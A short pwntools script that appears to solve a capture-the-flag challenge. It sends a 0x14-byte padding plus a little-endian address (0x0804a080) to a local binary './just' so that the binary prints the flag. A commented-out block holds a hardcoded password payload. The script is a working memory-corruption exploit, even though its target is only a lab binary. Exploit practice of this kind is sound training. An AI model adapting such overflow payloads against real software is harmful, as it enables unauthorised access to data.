from pwn import *
import sys

# this will just print the password needed to have the success message
# payload = bytearray("P@SSW0RD", "utf8")+p8(0x00)
# sys.stdout.buffer.write(payload)

# this is the address containing the flag 0x0804a080
true_payload = bytes([0] * 0x14) + bytes.fromhex("80a00408")
target = process('./just')
target.sendline(true_payload)
target.interactive()